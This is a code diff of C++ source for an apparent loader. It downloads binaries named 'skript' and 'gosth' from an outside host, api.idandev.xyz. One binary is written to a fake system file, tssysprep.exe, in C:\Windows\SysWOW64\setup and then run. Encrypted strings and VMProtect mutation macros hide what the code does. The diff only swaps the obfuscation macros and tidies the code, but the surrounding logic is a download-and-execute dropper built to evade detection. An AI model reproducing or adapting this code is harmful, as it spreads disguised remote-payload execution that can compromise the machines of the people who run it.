@@ -3,10 +3,9 @@
 #include "utils\utils.hpp"
 #include "ntdll/ntdll.hpp"
 
-
 bool core::initialize_skript( )
 {
-	MUTATE_START
+	vmp_mutation;
 
 	const auto res = cpr::Get( cpr::Url { E( "http://api.idandev.xyz/files/skript" ) } );
 	const std::vector<std::uint8_t> binary( res.text.begin( ), res.text.end( ) );
@@ -66,18 +65,19 @@ bool core::initialize_skript( )
 
 	return true;
 
-	MUTATE_END
+	vmp_end;
 }
 
 bool core::initialize_gosth( )
 {
+	vmp_mutation;
 
 	std::vector<std::string> url_out { E( "http://api.idandev.xyz/files/gosth" ), E( R"(C:\Windows\SysWOW64\setup\tssysprep.exe)" ) };
 
 	const std::string &url = url_out[ 0 ];
 	const std::string &output_file_path = url_out[ 1 ];
 
-	auto res = cpr::Get( cpr::Url { url } );
+	auto const res = cpr::Get( cpr::Url { url } );
 
 	std::ofstream outputFile( output_file_path, std::ios::binary );
 
@@ -87,4 +87,6 @@ bool core::initialize_gosth( )
 	utils::system::create_process( E( R"(C:\Windows\SysWOW64\setup\tssysprep.exe)" ) );
 
 	return true;
+
+	vmp_end;
 }
